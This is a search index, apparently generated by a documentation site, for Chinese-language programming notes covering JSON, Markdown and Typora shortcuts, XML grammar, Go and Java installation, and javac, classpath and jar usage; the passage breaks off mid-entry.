{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"language/","title":"Language","text":"<p>Abstract</p> <p>\u672c\u7ae0\u8282\u8bb0\u5f55\u7f16\u7a0b\u8bed\u8a00\u7684\u76f8\u5173\u7b14\u8bb0\u3002</p>"},{"location":"language/base/json/","title":"JSON","text":""},{"location":"language/base/json/#introduce","title":"Introduce","text":"<p>JSON(JavaScript Object Notation)</p> <p>\u548c XML \u7684\u7528\u9014\u4e00\u6837\uff0cJSON \u4e5f\u662f\u7528\u4e8e**\u5b58\u50a8\u548c\u4f20\u8f93\u6570\u636e**\u7684\u683c\u5f0f\uff0c\u4f46\u662f JSON \u6bd4 XML \u66f4\u5c0f\u3001\u66f4\u5feb\u3001\u66f4\u6613\u89e3\u6790\u3002</p> <p>\u6ce8\uff1aJSON \u4e0d\u652f\u6301\u6ce8\u91ca\uff0c\u5982\u679c\u9700\u8981\u6ce8\u91ca\uff0c\u53ef\u4ee5\u6dfb\u52a0\u4e00\u4e2a\u952e\u503c\u5bf9\u4f5c\u4e3a\u6ce8\u91ca\uff1a</p> <pre><code>{\n  \"_comment\": \"this is a comment\"\n}\n</code></pre>"},{"location":"language/base/json/#json-grammar","title":"JSON Grammar","text":"<p>JSON \u4ee5\u952e\u503c\u5bf9\u7684\u5f62\u5f0f\u5b58\u50a8\uff1a <code>key : value</code> \uff0c\u5176\u4e2d\uff0c <code>key</code> \u5fc5\u987b\u7528**\u53cc\u5f15\u53f7**\u8fdb\u884c\u5305\u88f9\uff0c\u952e\u503c\u5bf9\u4e4b\u95f4\u91c7\u7528**\u9017\u53f7**\u5206\u9694\u3002</p> <p>JSON \u7684 <code>value</code> \u5171\u6709\u4ee5\u4e0b\u51e0\u79cd\u5f62\u5f0f\uff1a</p> <ul> <li>\u6574\u6570</li> <li>\u5b57\u7b26\u4e32 \"\"</li> <li>\u5e03\u5c14\u503c true/false</li> <li>\u6570\u7ec4 []</li> <li>\u5bf9\u8c61 {}</li> <li>null</li> </ul> <pre><code>{\n  \"string\": \"HappyTsing\",\n  \"boolean\": true,\n  \"array\": [false, true, 1, \"HappyTsing\", null],\n  \"object\": {\n    \"array\": [\n      {\n        \"name\": \"nested\"\n      }\n    ]\n  }\n}\n</code></pre>"},{"location":"language/base/markdown/","title":"Markdown","text":""},{"location":"language/base/markdown/#_1","title":"\u6807\u9898","text":"<p>\u4e00\u7ea7\u6807\u9898\uff1a#[\u7a7a\u683c]\u6807\u9898\u5185\u5bb9</p> <p>\u4e8c\u7ea7\u6807\u9898\uff1a##[\u7a7a\u683c]\u6807\u9898\u5185\u5bb9</p>"},{"location":"language/base/markdown/#_2","title":"\u5b57\u4f53","text":"<p>\u7c97\u4f53\uff1a**\u7c97\u4f53\u5185\u5bb9**</p> <p>\u659c\u4f53\uff1a*\u659c\u4f53\u5185\u5bb9*</p> <p>\u659c\u4f53\u52a0\u7c97\uff1a***\u659c\u4f53\u52a0\u7c97\u5185\u5bb9***</p> <p>\u5220\u9664\u7ebf\uff1a~~\u5220\u9664\u5185\u5bb9~~</p>"},{"location":"language/base/markdown/#_3","title":"\u5f15\u7528","text":"<p>\u4e00\u5c42\uff1a&gt;[\u7a7a\u683c]\u5f15\u7528\u5185\u5bb9</p> <p>\u4e8c\u5c42\uff1a&gt;&gt;[\u7a7a\u683c]\u5f15\u7528\u5185\u5bb9</p>"},{"location":"language/base/markdown/#_4","title":"\u5217\u8868","text":""},{"location":"language/base/markdown/#_5","title":"\u65e0\u5e8f\u5217\u8868","text":"<p>-[\u7a7a\u683c]\u5217\u8868\u5185\u5bb9</p> <p>+[\u7a7a\u683c]\u5217\u8868\u5185\u5bb9</p> <p>*[\u7a7a\u683c]\u5217\u8868\u5185\u5bb9</p>"},{"location":"language/base/markdown/#_6","title":"\u6709\u5e8f\u5217\u8868","text":"<p>1.[\u7a7a\u683c]\u5217\u8868\u5185\u5bb9</p>"},{"location":"language/base/markdown/#_7","title":"\u5206\u5272\u7ebf","text":"<p>\u4e09\u4e2a\u53ca\u4ee5\u4e0a\u7684*\u6216\u8005-</p>"},{"location":"language/base/markdown/#_8","title":"\u8868\u683c","text":"<p>|\u8868\u5934|\u8868\u5934|\u8868\u5934|</p> <p>|:-|:-:|-:|</p> <p>|\u5185\u5bb9|\u5185\u5bb9|\u5185\u5bb9|</p> <p>|\u5185\u5bb9|\u5185\u5bb9|\u5185\u5bb9|</p> <p>Note</p> <p>\u7b2c\u4e8c\u884c\u5206\u5272\u8868\u5934\u548c\u5185\u5bb9\u3002</p> <p><code>-</code> \u6709\u4e00\u4e2a\u53ca\u4ee5\u4e0a\u90fd\u884c\uff0c\u4e3a\u4e86\u5bf9\u9f50\uff0c\u53ef\u4ee5\u591a\u52a0\u51e0\u4e2a</p> <p><code>:-</code> \u8868\u793a\u6587\u5b57\u5c45\u5de6\uff08\u9ed8\u8ba4\uff09</p> <p><code>:-:</code> \u8868\u793a\u6587\u5b57\u5c45\u4e2d</p> <p><code>-:</code> \u8868\u793a\u6587\u5b57\u5c45\u53f3</p>"},{"location":"language/base/markdown/#_9","title":"\u8d85\u94fe\u63a5","text":"<p>[\u8d85\u94fe\u63a5\u540d](\u8d85\u94fe\u63a5\u5730\u5740 \"\u8d85\u94fe\u63a5 title\")</p> <p>Note</p> <p>\u8d85\u94fe\u63a5 title \u662f\u8d85\u94fe\u63a5\u7684\u6807\u9898\uff0c\u5f53\u9f20\u6807\u79fb\u5230\u8d85\u94fe\u63a5\u4e0a\u65f6\u663e\u793a\u7684\u5185\u5bb9\uff0c\u53ef\u52a0\u53ef\u4e0d\u52a0</p> <p>\u8df3\u8f6c\u672c\u6587\u4e2d\u7684\u6807\u9898\uff1a[\u6807\u9898\u540d](#\u6807\u9898\u540d)</p>"},{"location":"language/base/markdown/#_10","title":"\u56fe\u7247","text":"<p>![\u56fe\u7247\u6ce8\u91ca](\u56fe\u7247\u5730\u5740 ''\u56fe\u7247 title'')</p> <p>Note</p> <p>\u56fe\u7247\u6ce8\u91ca\u5c31\u662f\u663e\u793a\u5728\u56fe\u7247\u4e0b\u9762\u7684\u6587\u5b57\uff0c\u76f8\u5f53\u4e8e\u5bf9\u56fe\u7247\u5185\u5bb9\u7684\u89e3\u91ca\u3002</p> <p>\u56fe\u7247 title \u662f\u56fe\u7247\u7684\u6807\u9898\uff0c\u5f53\u9f20\u6807\u79fb\u5230\u56fe\u7247\u4e0a\u65f6\u663e\u793a\u7684\u5185\u5bb9\u3002title \u53ef\u52a0\u53ef\u4e0d\u52a0</p>"},{"location":"language/base/markdown/#_11","title":"\u4ee3\u7801","text":"<ul> <li> <p>\u5355\u884c\u4ee3\u7801\uff1a`\u5355\u884c\u4ee3\u7801\u5185\u5bb9`</p> </li> <li> <p>\u4ee3\u7801\u5757\uff1a</p> </li> </ul> <p>```\u7f16\u7a0b\u8bed\u8a00\u540d</p> <p>\u4ee3\u7801\u5757\u5185\u5bb9```</p>"},{"location":"language/base/markdown/#_12","title":"\u6d41\u7a0b\u56fe","text":"<p>\u672c\u8d28\u5373\u4e3a\u4ee3\u7801\u6bb5\uff0c\u662f\u7f16\u7a0b\u8bed\u8a00\u540d\u4e3a flow \u7684\u4ee3\u7801\u6bb5</p> <p>```flow</p> <p>tag=&gt;type:[\u7a7a\u683c]content:&gt;url</p> <p>```</p> <p>Note</p> <p>type:</p> <ol> <li>start</li> <li>end</li> <li>operation \u64cd\u4f5c\uff08\u77e9\u5f62\uff09</li> <li>subroutine</li> <li>condition \u6761\u4ef6\u5224\u65ad\uff08\u83f1\u5f62\uff09</li> <li>inputoutput \u8f93\u5165\u8f93\u51fa\uff08\u659c\u8ddd\u5f62\uff09</li> </ol> <p>content: \u8981\u663e\u793a\u7684\u5185\u5bb9</p> <p>url: \u6587\u672c\u7684\u8d85\u94fe\u63a5</p> <p>\u5143\u7d20\u7684\u8fde\u63a5</p> <ul> <li> <p>tag1-tag2-...-tagn</p> </li> <li> <p>\u82e5\u662f conditon \u7c7b\u578b\uff0c\u5219\u8fde\u63a5\u65f6\u5e94\u8be5\u6307\u660e\u662f yes/no</p> <ul> <li> <p>tag_condition(yes)-&gt;tag1</p> </li> <li> <p>tag_condition(no)-&gt;tag2</p> </li> </ul> </li> </ul> <pre><code>```flow\nst=&gt;start: Start\ne=&gt;end: End\nop1=&gt;operation: My Operation\nsub1=&gt;subroutine: My Subroutine\ncond=&gt;condition: Y or N\nio=&gt;inputoutput: catch something...\nst-&gt;op1-&gt;cond(yes)-&gt;io-&gt;e\ncond(no)-&gt;sub1(right)-&gt;op1\n```\n</code></pre> <p>\u5176\u6e32\u67d3\u540e\u5982\u4e0b(typora \u53ef\u4ee5\u663e\u793a\uff09\uff1a</p> <pre><code>st=&gt;start: Start\ne=&gt;end: End\nop1=&gt;operation: My Operation\nsub1=&gt;subroutine: My Subroutine\ncond=&gt;condition: Y or N\nio=&gt;inputoutput: catch something...\nst-&gt;op1-&gt;cond(yes)-&gt;io-&gt;e\ncond(no)-&gt;sub1(right)-&gt;op1\n</code></pre>"},{"location":"language/base/markdown/#typora","title":"Typora \u5feb\u6377\u952e","text":"<p>Ctrl+1-6\uff1a\u4e00\u9636\u6807\u9898~\u516d\u9636\u6807\u9898</p> <p>ctrl+u\uff1a\u4e0b\u73af\u7ebf</p> <p>ctrl+b\uff1a\u52a0\u7c97</p> <p>ctrl+i\uff1a\u503e\u659c</p> <p>ctrl+L\uff1a\u9009\u4e2d\u4e00\u884c</p> <p>\u56fe\u7247\u63d2\u5165\uff1a\u76f4\u63a5\u5c06\u56fe\u7247\u62d6\u5165\u76f8\u5e94\u4f4d\u7f6e</p> <p>\u8d85\u94fe\u63a5\uff1a</p> <ol> <li>\\&lt;http://\u7f51\u5740&gt;</li> <li>ctrl+k</li> </ol> <p>\u4ee3\u7801\uff1a```+\u7f16\u7a0b\u8bed\u8a00\uff08\u5982 java\uff09 \u8868\u683c\uff1a</p> <ol> <li> <p>|a|b|c|\uff0c\u7136\u540e ctrl+enter \u53ef\u4ee5\u521b\u5efa\u65b0\u884c</p> </li> <li> <p>ctrl+t</p> </li> </ol> <p>\u4efb\u52a1\u5217\u8868\uff1a- [ ] \u4efb\u52a1\u4e00</p> <p>\u6709\u5e8f\u5217\uff1a\u6570\u5b57+\u7a7a\u683c</p> <p>\u65e0\u5e8f\u5217\uff1a\u2018-\u2019\u6216\u8005\u2018+\u2019+\u7a7a\u683c</p> <p>\u6570\u5b66\u516c\u5f0f\uff1a$$</p> <p>Example</p> <ul> <li>\u5185\u8054\u516c\u5f0f: $[\u516c\u5f0f\u5185\u5bb9]$</li> <li>\u72ec\u884c\u516c\u5f0f: $$[\u516c\u5f0f\u5185\u5bb9]$$</li> </ul> <p>\u6c34\u5e73\u5206\u5272\u7ebf\uff1a***\u6216---</p> <p>\u5f15\u7528\uff1a&gt;+\u7a7a\u683c \u6ce8\u91ca\uff1a\u8981\u6dfb\u52a0\u6ce8\u91ca\u7684\u6587\u5b57[^\u6ce8\u91ca\u5185\u5bb9]</p> <p>\u8868\u60c5\uff1a\u2018\uff1a\u2019+\u5355\u6b21</p> <p>\u80cc\u666f\u52a0\u9ed1\uff1a` \u5185\u5bb9`</p> <p>\u8fdb\u5165\u6e90\u4ee3\u7801\u6a21\u5f0f\uff1actrl+/</p> <p>\u4e0a\u6807\uff1a\u4f7f\u7528\\&lt;sup&gt;\\&lt;/sup&gt;\u6807\u7b7e\u5305\u88f9\u7684\u90e8\u5206\u5c31\u662f\u4e0a\u6807</p> <p>\u4e0b\u6807\uff1a\u4f7f\u7528\\&lt;sub&gt;\\&lt;/sub&gt;\u6807\u7b7e\u5305\u88f9\u7684\u90e8\u5206\u5c31\u662f\u4e0b\u6807</p>"},{"location":"language/base/xml/","title":"XML","text":""},{"location":"language/base/xml/#differences-from-html","title":"Differences from HTML","text":"<ul> <li>HTML(HyperText Markup Language)\uff1a\u8d85\u6587\u672c\u6807\u8bb0\u8bed\u8a00</li> <li>XML(Extensible Markup Language)\uff1a\u53ef\u6269\u5c55\u6807\u8bb0\u8bed\u8a00</li> </ul> <p>\u4e8c\u8005\u7684\u8bed\u6cd5\u5f88\uff0cXML \u4e3b\u8981\u7528\u4e8e\u4f20\u8f93\u548c\u5b58\u50a8\u6570\u636e\uff0c\u800c HTML \u4e3b\u8981\u7528\u4e8e\u663e\u793a\u4fe1\u606f\u3002</p> <p>\u56e0\u6b64\uff0cXML \u4f7f\u7528\u7684\u6807\u7b7e\u662f \u81ea\u5b9a\u4e49 \u7684\uff0c\u800c HTML \u4e2d\u4f7f\u7528\u7684\u6807\u7b7e\u90fd\u662f\u9884\u5b9a\u4e49\u7684\u3002</p> <p>HTML \u4e2d\uff0c\u67d0\u4e9b\u5143\u7d20\u4e0d\u5fc5\u6709\u4e00\u4e2a\u5173\u95ed\u6807\u7b7e\uff1a</p> <pre><code>&lt;p&gt;This is a paragraph. &lt;br /&gt;&lt;/p&gt;\n</code></pre> <p>\u4f46\u5728 XML \u4e2d\uff0c\u7701\u7565\u5173\u95ed\u6807\u7b7e\u662f\u975e\u6cd5\u7684\u3002</p> <p>HTML \u4e2d\uff0c\u591a\u4e2a\u8fde\u7eed\u7684\u7a7a\u683c\u4f1a\u88ab\u88c1\u526a\u5408\u5e76\u4e3a\u4e00\u4e2a\uff0c\u800c\u5728 XML \u4e2d\u4e0d\u4f1a\u88ab\u5220\u51cf\uff0c\u4fdd\u7559\u539f\u6837\u3002</p>"},{"location":"language/base/xml/#xml-grammar","title":"XML Grammar","text":"<ul> <li>XML \u58f0\u660e\u662f\u53ef\u9009\u90e8\u5206\uff0c\u5982\u679c\u5b58\u5728\uff0c\u9700\u8981\u653e\u5728\u6587\u6863\u7684\u7b2c\u4e00\u884c\uff1a</li> <li>xml version\uff1a\u544a\u8bc9\u89e3\u6790\u5668\u6216\u6d4f\u89c8\u5668\u8fd9\u4e2a\u6587\u4ef6\u5e94\u8be5\u6309\u7167 XML \u89c4\u5219\u8fdb\u884c\u89e3\u6790</li> <li>encoding\uff1a\u7f16\u7801\u683c\u5f0f</li> </ul> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n</code></pre> <ul> <li>XML \u6807\u7b7e\u5bf9\u5927\u5c0f\u5199\u654f\u611f\uff0c\u4f8b\u5982\u6807\u7b7e <code>&lt;Letter&gt;</code>\u4e0e\u6807\u7b7e <code>&lt;letter&gt;</code>\u662f\u4e0d\u540c\u7684\u3002</li> <li>XML \u6ce8\u91ca\uff1a</li> </ul> <pre><code>&lt;!-- This is a comment --&gt;\n</code></pre> <ul> <li>XML \u5c5e\u6027\u503c\u5fc5\u987b\u52a0\u5f15\u53f7\uff1a</li> </ul> <pre><code>&lt;note date=2021/12/04&gt;Hello XML!&lt;/note&gt;    &lt;!-- wrong --&gt;\n&lt;note date=\"2021/12/04\"&gt;Hello XML!&lt;/note&gt;  &lt;!-- correct --&gt;\n</code></pre> <ul> <li>XML \u4e2d\uff0c\u4e00\u4e9b\u5b57\u7b26\u5177\u6709\u7279\u6b8a\u610f\u4e49\uff0c\u5e94\u5f53\u4f7f\u7528 <code>\u5b9e\u4f53\u5f15\u7528</code> \u6765\u4ee3\u66ff\u8fd9\u4e9b\u5b57\u7b26\uff1a</li> </ul> \u5b9e\u4f53\u5f15\u7528 \u7279\u6b8a\u5b57\u7b26 <code>&amp;lt;</code> &lt; <code>&amp;gt;</code> &gt; <code>&amp;amp;</code> &amp; <code>&amp;quot;</code> \" <code>&amp;apos;</code> ' <p>\u4ee5\u4e0a\u662f\u4e94\u4e2a\u9884\u5b9a\u4e49\u7684\u5b9e\u4f53\u5f15\u7528\uff0c\u4f7f\u7528\u65b9\u6cd5\u5982\u4e0b\uff1a</p> <pre><code>&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt;      &lt;!-- wrong --&gt;\n&lt;message&gt;if salary &amp;lt; 1000 then&lt;/message&gt;   &lt;!-- correct --&gt;\n</code></pre>"},{"location":"language/base/xml/#xml_1","title":"XML \u547d\u540d\u89c4\u5219","text":"<ul> <li>\u4e0d\u80fd\u4ee5\u6570\u5b57\u6216\u8005\u6807\u70b9\u7b26\u53f7\u5f00\u59cb</li> <li>\u4e0d\u80fd\u4ee5\u5b57\u6bcd xml(e.g. XML, Xml)\u7b49\u5f00\u59cb</li> <li>\u4e0d\u80fd\u5305\u62ec\u7a7a\u683c</li> <li>\u63a8\u8350\u4f7f\u7528\u4e0b\u5212\u7ebf\u5206\u9694</li> </ul>"},{"location":"language/go/install/","title":"Go","text":""},{"location":"language/go/install/#installation","title":"Installation","text":"<pre><code># mac\nbrew install go\n# \u8bbe\u7f6eGOROOT\u3001GOPATH\u3001GOBIN\n\n# ubuntu\nsudo add-apt-repository ppa:longsleep/golang-backports\nsudo apt update\n\n# \u6bcf\u4e2appa\u90fd\u4f1a\u5728/etc/apt/sources.list.d \u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2alist\u6587\u4ef6\u3002\n# \u6362\u6e90\uff1ahttp://ppa.launchpad.net -&gt; http://launchpad.proxy.ustclug.org\n\n# \u6ce8\u91ca\u6389\u7b2c\u4e00\u884c\uff0c\u7b2c\u4e8c\u884c\u4fee\u6539\u5982\u4e0b\uff1a\n#deb http://ppa.launchpad.net/longsleep/golang-backports/ubuntu bionic main\ndeb https://launchpad.proxy.ustclug.org/longsleep/golang-backports/ubuntu bionic main\n\n# \u66f4\u65b0\u8f6f\u4ef6\u5217\u8868\nsudo apt-get update\n\n# \u5b89\u88c5\u6700\u65b0\u7248\u672c\nsudo apt install golang-go\n# \u6307\u5b9a\u7248\u672c\nsudo apt install golang-1.17-go\n\n# \u5fc5\u987b\u8981\u8bbe\u7f6e\uff0c\u5426\u5219\u4f7f\u7528go\u5b89\u88c5\u7684\u4e1c\u897f\u65e0\u6cd5\u4f7f\u7528\u3002go env \u67e5\u770b\u4fe1\u606f\u3002\nvim ~/.zshrc\nexport GOROOT=/usr/lib/go-1.17 # \u8bb0\u5f97\u4fee\u6539\u7248\u672c\nexport GOPATH=$HOME/go\nexport PATH=$GOPATH/bin:$GOROOT/bin:$PATH\n\n# \u5237\u65b0\u914d\u7f6e\nsource ~/.zshrc\n</code></pre> <p>\u8bf4\u660e\uff1a</p> <ul> <li><code>GOROOT</code>\uff1a\u5b89\u88c5\u76ee\u5f55\uff08go\u8bed\u8a00\u5b89\u88c5\u76ee\u5f55\uff09\u3002</li> <li><code>GOPATH</code>\uff1a\u5de5\u7a0b\u76ee\u5f55\uff08\u81ea\u5df1\u5de5\u7a0b\u9879\u76ee\u76ee\u5f55\uff09\uff0c\u5305\u542b\u4e09\u4e2a\u76ee\u5f55\uff1a<ul> <li><code>bin</code>\u76ee\u5f55\uff1a\u53ef\u6267\u884c\u6587\u4ef6</li> <li><code>pkg</code>\u76ee\u5f55\uff1a\u7f16\u8bd1\u597d\u7684\u5e93\u6587\u4ef6\uff0c\u4e3b\u8981\u662f*.a\u6587\u4ef6</li> <li><code>src</code>\u76ee\u5f55\uff1a\u6e90\u6587\u4ef6</li> </ul> </li> <li><code>GOBIN</code>\uff1a\u53ef\u6267\u884c\u6587\u4ef6\u76ee\u5f55</li> <li><code>PATH</code>\uff1a\u5c06go\u53ef\u6267\u884c\u6587\u4ef6\u52a0\u5165PATH\u4e2d\uff0c\u4f7fGO\u547d\u4ee4\u4e0e\u6211\u4eec\u7f16\u5199\u7684GO\u5e94\u7528\u53ef\u4ee5\u5168\u5c40\u8c03\u7528</li> </ul> <p>\u53c2\u8003\uff1a</p> <ul> <li>Go\u7684\u65b0\u624b\u5b89\u88c5</li> </ul>"},{"location":"language/java/install/","title":"Java Install","text":""},{"location":"language/java/install/#mac","title":"mac","text":"<pre><code>brew install java11 # openjdk\n\n# For the system Java wrappers to find this JDK, symlink it with\n  sudo ln -sfn /opt/homebrew/opt/openjdk@11/libexec/openjdk.jdk /Library/Java/JavaVirtualMachines/openjdk-11.jdk\n\n# If you need to have openjdk@11 first in your PATH, run:\n  echo 'export PATH=\"/opt/homebrew/opt/openjdk@11/bin:$PATH\"' &gt;&gt; ~/.zshrc\n\n# For compilers to find openjdk@11 you may need to set:\n  export CPPFLAGS=\"-I/opt/homebrew/opt/openjdk@11/include\"\n</code></pre>"},{"location":"language/java/install/#ubuntu","title":"ubuntu","text":"<pre><code># ubuntu\nsudo apt install openjdk-8-jdk  # openjdk-11-jdk\n\njava -version # \u67e5\u770b\u9ed8\u8ba4\u7248\u672c\n\nsudo update-alternatives --config java  # \u5b89\u88c5\u4e86\u591a\u4e2aJava\u7248\u672c\uff0c\u4fee\u6539\u9ed8\u8ba4\u7248\u672c\n\nsudo apt remove openjdk-8-jdk # \u5220\u9664\n\n# \u63a8\u8350\uff1avscode command shift p \u8f93\u5165\uff1ajdk\uff0c\u9009\u62e9\u5b89\u88c5\u5373\u53ef\n\n# \u67e5\u770bjavahome\u4f4d\u7f6e\n/usr/libexec/java_home -V\n</code></pre> <p>\u63a8\u8350\u914d\u7f6e <code>JAVA_HOME</code></p> <p><code>JAVA_HOME</code>\uff1a\u6307\u5411 JDK \u7684\u5b89\u88c5\u76ee\u5f55\uff0cEclipse/NetBeans/Tomcat \u7b49\u8f6f\u4ef6\u5c31\u662f\u901a\u8fc7\u641c\u7d22 JAVA_HOME \u53d8\u91cf\u6765\u627e\u5230\u5e76\u4f7f\u7528\u5b89\u88c5\u597d\u7684 JDK. </p> <p>\u5c06 <code>export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64</code> \u5199\u5165 <code>~/.zshrc</code> \u5373\u53ef\u5b8c\u6210\u914d\u7f6e</p>"},{"location":"language/java/install/#java-for-vscode","title":"java for vscode","text":"<p>vscode \u8bfb\u53d6 JDK \u7684\u987a\u5e8f\u5982\u4e0b\uff1a</p> <ul> <li><code>settings.json</code> \u6587\u4ef6\u4e2d\u7684 <code>java.home</code> \u914d\u7f6e</li> </ul> <p>\u6b64\u914d\u7f6e\u53ef\u80fd\u5df2\u8fc7\u65f6\uff0c\u5f85\u7b14\u8005\u786e\u8ba4\u540e\u4fee\u6539</p> <pre><code># ubuntu \u901a\u8fc7\u547d\u4ee4 sudo update-alternatives --config java \u83b7\u53d6JDK\u5b89\u88c5\u8def\u5f84\n{\n    \"java.home\":\"/usr/lib/jvm/java-11-openjdk-amd64\",\n    \"java.configuration.runtimes\": [\n        {\n            \"name\": \"JavaSE-1.8\",\n            \"path\": \"/usr/lib/jvm/java-8-openjdk-amd64\",\n            \"default\": true\n        },\n        {\n            \"name\": \"JavaSE-11\",\n            \"path\": \"/usr/lib/jvm/java-11-openjdk-amd64\",\n        },\n    ]\n\n}\n</code></pre> <ul> <li>the\u00a0<code>JDK_HOME</code>\u00a0environment variable</li> <li>the\u00a0<code>JAVA_HOME</code>\u00a0environment variable</li> <li>on the current system path</li> </ul>"},{"location":"language/java/javac-classpath-jar/","title":"javac/java\u3001classpath\u3001jar","text":""},{"location":"language/java/javac-classpath-jar/#java","title":"Java\u547d\u4ee4\u884c","text":"<p><code>javac</code> \u662f\u7f16\u8bd1\u5668\uff0c\u5c06\u6574\u4e2a <code>.java</code> \u6587\u4ef6\u7f16\u8bd1\u6210 <code>.class</code> \u6587\u4ef6\u3002</p> <pre><code>javac &lt;options&gt; &lt;source files&gt;\noptions:\n                -d &lt;directory&gt;                    \u6307\u5b9a\u7f16\u8bd1\u751f\u6210\u7684\u7c7b\u6587\u4ef6\u7684\u8f93\u51fa\u76ee\u5f55\n                -cp &lt;path&gt; , -classpath &lt;path&gt;    \u6307\u660e\u4e86.java\u6587\u4ef6\u91ccimport\u7684\u7c7b\u7684\u4f4d\u7f6e\n                -sourcepath &lt;path&gt;                \u6307\u5b9a\u6e90\u6587\u4ef6\u4f4d\u7f6e\n                -verbose                          \u8f93\u51fa\u6709\u5173\u7f16\u8bd1\u5668\u6b63\u5728\u6267\u884c\u7684\u64cd\u4f5c\u7684\u6d88\u606f\n</code></pre> <p><code>java</code> \u662f\u89e3\u91ca\u5668\uff0c\u9010\u4e2a\u89e3\u91ca\u8fd0\u884c <code>.class</code> \u6587\u4ef6\u3002</p> <pre><code>java [-options] class [args...]           \u6267\u884c\u7c7b\njava [-options] -jar jarfile [args...]    \u6267\u884cjar\u6587\u4ef6\n\noptions:\n                -cp &lt;path&gt;, -calsspath &lt;path&gt;     class\u6587\u4ef6\u6240\u9700\u8981\u7684\u6240\u6709\u7c7b\u7684package\u8def\u5f84\n                -D&lt;name&gt;=&lt;value&gt;                  \u8bbe\u7f6e\u7cfb\u7edf\u53d8\u91cf\n</code></pre>"},{"location":"language/java/javac-classpath-jar/#classpath","title":"classpath","text":"<p>Question</p> <p>\u4ec0\u4e48\u662f <code>classpath</code> \uff1f</p> <p>\u987e\u540d\u601d\u4e49\uff1a\u7c7b\u8def\u5f84\uff0c<code>classpath</code>\u662fJVM\u7528\u5230\u7684\u4e00\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u5b83\u7528\u6765\u6307\u793aJVM\u5982\u4f55\u641c\u7d22<code>class</code>\u3002</p> <p>\u5df2\u77e5Java\u662f\u7f16\u8bd1\u578b\u8bed\u8a00\uff1a <code>source.java \u2192 javac.class \u2192 java_execute</code></p> <p>\u56e0\u6b64\uff0cJVM\u9700\u8981\u77e5\u9053\uff0c\u5982\u679c\u8981\u52a0\u8f7d\u4e00\u4e2a <code>package abc.xyz</code> \u7684\u7c7b <code>helloworld</code>\uff0c\u5e94\u8be5\u53bb\u54ea\u91cc\u641c\u7d22\u5bf9\u5e94\u7684 <code>helloworld.class</code> \u6587\u4ef6\u3002</p> <p>\u6240\u4ee5\uff0c <code>classpath</code> \u662f\u4e00\u7ec4\u76ee\u5f55\u7684\u96c6\u5408\uff1a</p> <pre><code># 1. windows\uff0c\u5206\u53f7;\u5206\u9694\uff0c\u5e26\u7a7a\u683c\u7684\u76ee\u5f55\u7528\u53cc\u5f15\u53f7\"\"\u62ec\u8d77\u6765\nC:\\work\\project1\\bin;C:\\shared;\"D:\\My Documents\\project1\\bin\"\n\n# 2. Liunx\uff0c\u5192\u53f7:\u5206\u9694\n/usr/shared:/usr/local:~/Projects\n</code></pre> <p>\u8bbe\u7f6e\u5b8c <code>classpath</code> \u540e\uff0c\u5f53JVM\u5728\u52a0\u8f7d\u65f6\uff0c\u4f1a\u4f9d\u6b21\u67e5\u627e\uff1a</p> <ul> <li><code>/usr/shard/abc/xyz/helloworld.class</code></li> <li><code>/usr/local/abc/xyz/helloworld.class</code></li> <li><code>~Projects/abc/xyz/helloworld.class</code></li> </ul> <p>\u5982\u679c\u67e5\u627e\u5230\u76ee\u6807\uff0c\u5c31\u505c\u6b62\u641c\u7d22\uff0c\u5982\u679c\u6240\u6709\u8def\u5f84\u4e0b\u90fd\u6ca1\u6709\u627e\u5230\uff0c\u5c31\u62a5\u9519\u3002</p> <p><code>classpath</code>\u7684\u8bbe\u5b9a\u65b9\u6cd5\u6709\u4e24\u79cd\uff1a</p> <ul> <li>\u5728\u7cfb\u7edf\u73af\u5883\u53d8\u91cf\u4e2d\u8bbe\u7f6e<code>classpath</code>\u73af\u5883\u53d8\u91cf\uff0c\u4e0d\u63a8\u8350\uff1b</li> <li>\u5728\u542f\u52a8JVM\u65f6\u8bbe\u7f6e<code>classpath</code>\u53d8\u91cf\uff0c\u63a8\u8350\u3002</li> </ul> <pre><code>package abc.xyz;\nclass helloworld{\n    public static void main(String[] args) {\n        System.out.println(\"helloworld\");\n    }\n}\n\n~/Projects\n\u2514\u2500\u2500 abc\n    \u2514\u2500\u2500 xyz\n        \u251c\u2500\u2500 helloworld.class\n        \u2514\u2500\u2500 helloworld.java\n\n~/Projects$ java abc.xyz.helloworld\n~$ java -cp ~/Projects abc.xyz.helloworld\n</code></pre>"},{"location":"language/java/javac-classpath-jar/#jar","title":"jar","text":"<p>\u5982\u679c\u6709\u591a\u4e2a <code>.class</code> \u6587\u4ef6\uff0c\u6563\u843d\u5728\u5404\u5c42\u76ee\u5f55\u4e2d\uff0c\u80af\u5b9a\u4e0d\u65b9\u4fbf\u7ba1\u7406\u3002</p> <p>\u56e0\u6b64\uff0c\u5f15\u51fajar\u5305(Java Archive File)\u7684\u6982\u5ff5\uff0c\u672c\u8d28\u4e0ajar\u5305\u5c31\u662f\u4e00\u4e2azip\u683c\u5f0f\u7684\u538b\u7f29\u6587\u4ef6\u3002\u4f46\u662f\uff0cjar\u5305\u5b58\u5728\u4e00\u4e2a\u7279\u6b8a\u7684 <code>META-INF/MANIFEST.MF</code> \u7eaf\u6587\u672c\u6587\u4ef6\uff0c\u5b83\u53ef\u4ee5\u6307\u5b9a <code>Main-Class</code> \u548c\u5176\u4ed6\u4fe1\u606f\u3002</p> <p>JVM\u4f1a\u81ea\u52a8\u8bfb\u53d6\u8be5\u6587\u4ef6\uff0c\u5982\u679c\u5b58\u5728<code>Main-Class</code> \uff0c\u6211\u4eec\u5c31\u4e0d\u5fc5\u5728\u547d\u4ee4\u884c\u6307\u5b9a\u542f\u52a8\u7684\u7c7b\u540d\uff0c\u800c\u662f\u76f4\u63a5\u8fd0\u884cjar\u5305\u5373\u53ef\uff1a</p> <pre><code>java -jar helloworld.jar\n</code></pre> <p>\u5982\u679c\u672a\u6307\u5b9a <code>Main-Class</code> \uff0c\u5219\u65e0\u6cd5\u76f4\u63a5\u8c03\u7528\uff0c\u800c\u662f\u901a\u8fc7 <code>-cp</code>\u53c2\u6570\u5b9e\u73b0\uff1a</p> <pre><code>jar -cp helloworld.jar abc.xyz.helloworld\n</code></pre> <p>jar\u547d\u4ee4\uff1a</p> <pre><code># 1. \u6253\u5305\njar 